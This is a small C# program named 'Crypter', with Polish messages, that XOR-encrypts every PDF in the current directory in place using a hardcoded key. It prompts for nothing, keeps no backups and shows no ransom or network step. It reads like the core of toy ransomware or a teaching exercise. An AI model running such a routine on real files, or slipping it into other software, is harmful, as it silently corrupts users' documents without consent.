using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace Crypter
{
    class Program
    {
        const string SecretKey = "super sekretne hasło";

        static void Main(string[] args)
        {
            IEnumerable<FileInfo> files = new DirectoryInfo(Directory.GetCurrentDirectory()).EnumerateFiles("*.pdf");
            foreach (var file in files)
            {
                Console.WriteLine("Szyfruje {0}", file.Name);
                Encrypt(file);
            }
        }

        private static void Encrypt(FileInfo file)
        {
            using (FileStream fileStream = file.Open(FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
            {
                byte[] contents = new byte[fileStream.Length];
                byte[] key = Encoding.UTF8.GetBytes(SecretKey);

                fileStream.Read(contents, 0, (int)fileStream.Length);
                for (int i = 0; i < contents.Length; i++)
                {
                    contents[i] ^= key[i % key.Length];
                }

                fileStream.Position = 0;
                fileStream.Write(contents, 0, contents.Length);
            }
        }
    }
}
